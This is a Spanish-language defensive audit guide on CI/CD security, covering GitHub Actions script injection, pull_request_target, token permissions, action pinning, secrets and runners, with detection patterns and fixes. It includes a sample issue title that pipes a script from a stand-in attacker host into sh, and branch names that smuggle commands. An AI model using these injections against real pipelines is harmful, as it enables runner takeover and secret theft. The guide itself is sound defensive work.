# Seguridad de CI/CD

Aplica si el inventario detectó **pipelines de integración o despliegue continuo**:
GitHub Actions, GitLab CI, Jenkins, CircleCI, o cualquier automatización que se
dispare con un push, un PR o un comentario.

Por qué merece su propio bloque: el runner de CI suele ser el proceso con **más
privilegios de todo el proyecto** — tiene los secretos de despliegue, credenciales
de la nube, tokens del registro de paquetes y permiso de escritura sobre el repo.
Comprometerlo suele dar más que comprometer la aplicación. Y casi nunca se audita,
porque "es solo configuración".

Contenido: inyección de script · `pull_request_target` · permisos del token ·
acciones sin fijar · secretos en CI · runners autoalojados

## 1. Inyección de script (la más grave y la más común)

GitHub Actions **interpola `${{ ... }}` textualmente en el shell antes de ejecutarlo**.
Si la expresión contiene datos que controla quien abre un issue o un PR, ese texto
se convierte en comandos. No es escapado: es sustitución literal.

El título de un issue como `"; curl atacante.invalid/x | sh #` ejecuta código en el
runner, con sus secretos.

### Patrones a buscar en `.github/workflows/*.yml`

```
run:.*\$\{\{\s*github\.event\.issue\.title
run:.*\$\{\{\s*github\.event\.issue\.body
run:.*\$\{\{\s*github\.event\.pull_request\.title
run:.*\$\{\{\s*github\.event\.pull_request\.body
run:.*\$\{\{\s*github\.event\.comment\.body
run:.*\$\{\{\s*github\.event\.review\.body
run:.*\$\{\{\s*github\.event\.head_commit\.message
run:.*\$\{\{\s*github\.head_ref
run:.*\$\{\{\s*github\.event\.          # captura amplia: cualquier dato del evento
```

Campos controlables por un tercero sin permisos en el repo: título y cuerpo de
issues, PRs, comentarios y reviews; mensajes de commit; `head_ref` (nombre de rama);
nombre para mostrar del autor.

**Sobre `github.head_ref` en particular:** es fácil descartarlo pensando que git no
admite metacaracteres en nombres de rama. Sí los admite. Verificable con
`git check-ref-format`: `feat/x;whoami`, `feat/x|id`, `feat/x&&id`, `feat/$(id)` y
``feat/`id` `` son todos nombres de rama **válidos**. Git solo rechaza espacios,
`~`, `^`, `:`, `?`, `*`, `[`, `\` y unos pocos casos más — ninguno de los cuales hace
falta para inyectar. Un fork con una rama así, interpolada en un `run:`, ejecuta.

### Vulnerable

```yaml
- name: Saludar
  run: echo "Nuevo issue: ${{ github.event.issue.title }}"
```

### Corregido

El dato pasa por una variable de entorno: el shell la trata como valor, no como código.

```yaml
- name: Saludar
  env:
    TITULO: ${{ github.event.issue.title }}
  run: echo "Nuevo issue: $TITULO"
```

**CWE-78 / CWE-94 · OWASP A03 · Crítica** (impacto alto / explotable por cualquiera
con una cuenta de GitHub).

## 2. `pull_request_target` con checkout del código del PR

`pull_request_target` corre con los **secretos del repositorio y token de escritura**,
a diferencia de `pull_request`. Existe para que un workflow pueda etiquetar o comentar
en PRs de forks. Si además hace checkout del código del fork y lo ejecuta —build,
tests, lint— cualquiera que abra un PR ejecuta su código con tus secretos.

**El detalle que lo convierte en explotación trivial: no hace falta que el workflow
llegue a ejecutar el build.** `npm install` (y `yarn`, y `pnpm install`) ejecutan los
scripts `preinstall`/`install`/`postinstall` del `package.json` **del fork**. Es decir,
la línea `run: npm install` por sí sola ya es ejecución de código controlado por el
atacante, antes de que corra un solo test. Lo mismo aplica a `pip install -e .`
(ejecuta `setup.py`) y a `bundle install` con gemas de ruta local.

Mitigación cuando la instalación es inevitable: `npm ci --ignore-scripts`. Pero si el
workflow tiene secretos y toca código de un fork, la corrección real es separarlo, no
endurecer la instalación.

### Patrón

```
on:\s*pull_request_target        # y en el mismo archivo:
uses:\s*actions/checkout.*ref:\s*\$\{\{\s*github\.event\.pull_request\.head
```

La combinación de ambos es el hallazgo. `pull_request_target` solo, sin checkout del
head del PR, es un uso legítimo.

### Corregido

Usar `pull_request` para todo lo que ejecute código del PR, y reservar
`pull_request_target` para pasos que no hagan checkout del fork. Si hacen falta las
dos cosas, separarlas en dos workflows.

**CWE-269 · OWASP A01 · Crítica.**

## 3. Permisos del token demasiado amplios

El `GITHUB_TOKEN` hereda permisos por defecto que suelen exceder lo necesario. Si
cualquier paso del workflow se compromete —una acción de terceros, una dependencia
con `postinstall`— esos permisos son los del atacante.

### Patrones

```
permissions:\s*write-all
# o la ausencia total de una clave `permissions:` en el workflow
```

### Corregido

Declarar el mínimo a nivel de workflow y ampliarlo por job solo donde haga falta:

```yaml
permissions:
  contents: read      # por defecto para todo el workflow

jobs:
  publicar:
    permissions:
      contents: read
      packages: write  # solo este job necesita escribir
```

**CWE-250 / CWE-732 · OWASP A01 · Alta.**

## 4. Acciones de terceros sin fijar a un SHA

`uses: alguien/accion@v3` resuelve una **etiqueta mutable**. Quien controle el repo de
la acción puede mover `v3` a un commit distinto y ejecutar código nuevo en todos los
pipelines que la usan, sin que cambie ni una línea de tu repo. Ha ocurrido en ataques
reales de cadena de suministro.

### Patrones

```
uses:\s*[^/]+/[^@]+@(main|master|v\d+(\.\d+)*)\s*$    # etiqueta o rama, no SHA
uses:\s*[^/]+/[^@]+\s*$                               # sin referencia alguna
```

### Corregido

```yaml
- uses: actions/checkout@8f4b7f84864484a7bf31766abe9204da3cbe65b3  # v3.5.0
```

El comentario con la versión legible es convención, para que se pueda actualizar.
Las acciones publicadas por el propio GitHub (`actions/*`) son de menor riesgo, pero
fijarlas es igual de barato.

**CWE-829 · OWASP A08 · Alta.**

## 5. Manejo de secretos en el pipeline

- **Secretos por línea de comandos**: los argumentos son visibles en la lista de
  procesos del runner. Pasarlos por `env:` o por stdin.
- **Secretos en logs**: `echo $TOKEN`, `set -x`, o un `curl -v` que imprime la cabecera
  `Authorization`. GitHub enmascara los valores registrados como secretos, pero no los
  derivados (un secreto en base64 sale en claro).
- **Secretos expuestos a pasos de PRs de forks**: cualquier secreto disponible en un
  workflow que ejecute código no confiable debe considerarse comprometido.
- **Credenciales de larga vida**: preferir OIDC / federación de identidad
  (`id-token: write` + rol asumible en la nube) a una clave de acceso estática guardada
  como secreto. Elimina la rotación y el riesgo de fuga persistente.

### Patrones

```
run:.*echo.*\$\{\{\s*secrets\.
run:.*--password[= ]\$\{\{\s*secrets\.
run:.*--token[= ]\$\{\{\s*secrets\.
set -x
```

**CWE-200 / CWE-214 · OWASP A02 · Crítica si hay evidencia de fuga en logs.**

## 6. Runners autoalojados en repositorios públicos

Un runner autoalojado ejecuta el código de cualquier PR en **tu infraestructura**.
En un repo público, eso es ejecución remota de código por diseño. Los runners de
GitHub son efímeros; los tuyos no — un atacante puede dejar persistencia que
sobrevive al siguiente job.

### Patrón

```
runs-on:\s*(self-hosted|\[.*self-hosted)
```

Verificar junto a la visibilidad del repositorio. En un repo privado con
colaboradores de confianza es aceptable; en uno público es un hallazgo alto salvo que
los runners sean efímeros y estén aislados.

**CWE-693 · OWASP A08 · Alta en repositorio público.**

## 7. Protección del disparador y de la propia definición del pipeline

Los controles anteriores endurecen cada workflow. Estos cortan cadenas enteras, y
suelen faltar porque no viven en el YAML sino en la configuración del repositorio:

- **Aprobación requerida para colaboradores externos.** En Settings → Actions,
  *"Require approval for all external contributors"* (o al menos para quienes nunca
  han contribuido). Sin esto, cualquiera con una cuenta dispara tus pipelines.
- **`environment:` con revisores requeridos** en los jobs que despliegan o publican.
  Los secretos de un entorno protegido no se entregan hasta que una persona aprueba,
  lo que convierte una cadena automática en una que necesita intervención humana:

  ```yaml
  jobs:
    publicar:
      environment: produccion   # con required reviewers configurados
  ```

- **CODEOWNERS sobre `.github/`.** Si el archivo de CI no requiere revisión para
  cambiarse, cualquiera con acceso de escritura puede exfiltrar todos los secretos
  con un commit — y eso incluye a un colaborador cuya cuenta fue comprometida.

  ```
  /.github/ @equipo-de-seguridad
  ```

- **Protección de tags** si hay workflows disparados por tags: sin ella, quien pueda
  empujar un tag puede disparar una publicación.

Estos cuatro no se ven leyendo los YAML. Hay que preguntarlos o revisarlos en la
configuración del repositorio, y si no tienes acceso, declararlo en la sección
"Cobertura" del reporte en vez de darlos por hechos.

## Otras plataformas

Los mecanismos cambian de nombre, el riesgo no:

- **GitLab CI**: variables protegidas y enmascaradas; ojo con las variables
  disponibles en pipelines de forks y con `rules:` que ejecutan código de MRs externos.
- **Jenkins**: `Jenkinsfile` con `sh "${params.X}"` es el mismo fallo de inyección;
  revisar también permisos de la instancia y plugins desactualizados.
- **Genérico**: ¿quién puede modificar el pipeline? Si el archivo de CI no requiere
  revisión para cambiarse, cualquiera con acceso de escritura puede exfiltrar todos
  los secretos con un commit.

## Tabla resumen

| Patrón | CWE | OWASP | Severidad típica |
|---|---|---|---|
| Inyección de script en `run:` | CWE-78, CWE-94 | A03 | Crítica |
| `pull_request_target` + checkout del fork | CWE-269 | A01 | Crítica |
| `permissions: write-all` o ausente | CWE-250, CWE-732 | A01 | Alta |
| Acciones sin fijar a SHA | CWE-829 | A08 | Alta |
| Secretos en logs o argumentos | CWE-200, CWE-214 | A02 | Crítica si hay fuga |
| Runner autoalojado en repo público | CWE-693 | A08 | Alta |
| `npm install` sobre código de un fork (ejecuta `postinstall`) | CWE-94 | A08 | Crítica |
| Sin aprobación requerida para externos / sin `environment` protegido | CWE-862 | A01 | Alta |
| `.github/` sin CODEOWNERS | CWE-732 | A01 | Media |
